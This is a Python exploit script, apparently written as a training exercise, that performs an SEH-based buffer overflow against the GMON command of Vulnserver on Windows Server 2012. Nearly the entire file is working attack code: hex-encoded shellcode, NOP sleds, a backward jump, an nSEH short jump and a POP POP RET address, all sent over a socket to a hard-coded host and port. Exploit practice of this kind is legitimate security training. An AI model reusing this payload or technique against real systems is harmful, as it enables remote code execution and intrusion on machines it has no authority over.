#!/usr/bin/python

# Author: Michael Music
# Date: 2/26/2019
# Description: Vulnserver GMON Buffer Overflow Exploit
#  Exercise in BOFs given PoC code
#  Tested on Windows Server 2012
# Notes: Standard SEH based BOF using EXTREMELY sloppy NOP sleds and backwards JMPs

import socket
import os
import sys

host='10.10.10.10'
port=9999

# POP POP RET 0x625010b4
# SEH is at offset 3526 - should contain pop pop return address above
# nSEH is at offset 3522 - should contain the JMP to shellcode
# JMP 20 = \xEB\x0F\x90\x90

buf =  ""
buf += "\xda\xc9\xd9\x74\x24\xf4\xb8\x6a\x8d\xed\xbb\x5b\x31"
buf += "\xc9\xb1\x31\x31\x43\x18\x83\xc3\x04\x03\x43\x7e\x6f"
buf += "\x18\x47\x96\xed\xe3\xb8\x66\x92\x6a\x5d\x57\x92\x09"
buf += "\x15\xc7\x22\x59\x7b\xeb\xc9\x0f\x68\x78\xbf\x87\x9f"
buf += "\xc9\x0a\xfe\xae\xca\x27\xc2\xb1\x48\x3a\x17\x12\x71"
buf += "\xf5\x6a\x53\xb6\xe8\x87\x01\x6f\x66\x35\xb6\x04\x32"
buf += "\x86\x3d\x56\xd2\x8e\xa2\x2e\xd5\xbf\x74\x25\x8c\x1f"
buf += "\x76\xea\xa4\x29\x60\xef\x81\xe0\x1b\xdb\x7e\xf3\xcd"
buf += "\x12\x7e\x58\x30\x9b\x8d\xa0\x74\x1b\x6e\xd7\x8c\x58"
buf += "\x13\xe0\x4a\x23\xcf\x65\x49\x83\x84\xde\xb5\x32\x48"
buf += "\xb8\x3e\x38\x25\xce\x19\x5c\xb8\x03\x12\x58\x31\xa2"
buf += "\xf5\xe9\x01\x81\xd1\xb2\xd2\xa8\x40\x1e\xb4\xd5\x93"
buf += "\xc1\x69\x70\xdf\xef\x7e\x09\x82\x65\x80\x9f\xb8\xcb"
buf += "\x82\x9f\xc2\x7b\xeb\xae\x49\x14\x6c\x2f\x98\x51\x82"
buf += "\x65\x81\xf3\x0b\x20\x53\x46\x56\xd3\x89\x84\x6f\x50"
buf += "\x38\x74\x94\x48\x49\x71\xd0\xce\xa1\x0b\x49\xbb\xc5"
buf += "\xb8\x6a\xee\xa5\x5f\xf9\x72\x04\xfa\x79\x10\x58"

sploit = 'GMON /' + ('\x90' * (3522-746))
sploit += ('\x90' * 20)
sploit += ('\x90' * 100)
sploit += buf
sploit += ('\x90' * 100)
sploit += '\xE9\xA2\xFE\xFF\xFF'
sploit += ('\x90' * (3528 - len(sploit)))
sploit += ('\xEB\x0F\x90\x90') 
sploit += ('\xB4\x10\x50\x62') 
sploit += ('\x90' * 26) + ('\xE9\xA2\xFE\xFF\xFF') 
sploit += ('\x90' * (4000 - len(sploit)))

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.send(sploit)
expl.close()
